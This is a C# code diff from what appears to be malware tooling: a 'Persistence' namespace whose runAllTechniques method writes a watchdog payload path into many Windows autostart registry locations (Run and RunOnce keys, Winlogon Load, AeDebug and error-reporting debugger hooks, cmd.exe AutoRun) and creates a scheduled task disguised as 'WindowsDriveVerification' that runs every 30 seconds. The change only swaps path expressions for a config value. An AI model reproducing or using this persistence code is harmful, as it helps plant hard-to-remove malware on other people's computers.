@@ -6,39 +6,38 @@ namespace Persistence{
 
         public static void runAllTechniques()
         {
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName)); // Simple Run Keys
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServices", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServices", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "Run", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "Run", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows", "Load", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName));
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName));
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Config.PrimaryWatchdogFullPath); // Run Keys on startup
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Config.PrimaryWatchdogFullPath);
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServices", Config.PrimaryWatchdogFullPath);
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServices", Config.PrimaryWatchdogFullPath);
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "Run", Config.PrimaryWatchdogFullPath);
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Config.PrimaryWatchdogFullPath);
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "Run", Config.PrimaryWatchdogFullPath);
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Config.PrimaryWatchdogFullPath);
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows", "Load", Config.PrimaryWatchdogFullPath);
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Config.PrimaryWatchdogFullPath);
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Config.PrimaryWatchdogFullPath);
 
 
 
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug\", "Debugger", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName)); //relies on application crash
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs\", "Debugger", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName)); //relies on application crash
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug\", "Debugger", Config.PrimaryWatchdogFullPath); //relies on application crash
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs\", "Debugger", Config.PrimaryWatchdogFullPath); //relies on application crash
 
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Command Processor\", "AutoRun", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName)); //Runs when cmd.exe starts
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Command Processor\", "AutoRun", Config.PrimaryWatchdogFullPath); //Runs when cmd.exe starts
 
 
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "BackupPath", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName)); //These three are Windows background processes
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "cleanuppath", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName));
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "DefragPath", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName));
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "BackupPath", Config.PrimaryWatchdogFullPath); //These three are Windows background processes
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "cleanuppath", Config.PrimaryWatchdogFullPath);
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "DefragPath", Config.PrimaryWatchdogFullPath);
 
 
             string taskName = "WindowsDriveVerification";
-            string executablePath = Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName); // Path to the binary you want to run
 
             // Check if the task exists
             if (!TaskExists(taskName))
             {
                 // Create the task if it doesn't exist
-                CreateScheduledTask(taskName, executablePath, 30); // Runs every 30 seconds
+                CreateScheduledTask(taskName, Config.PrimaryWatchdogFullPath, 30); // Runs every 30 seconds
                 Console.WriteLine($"Scheduled task '{taskName}' created successfully.");
             }
             else
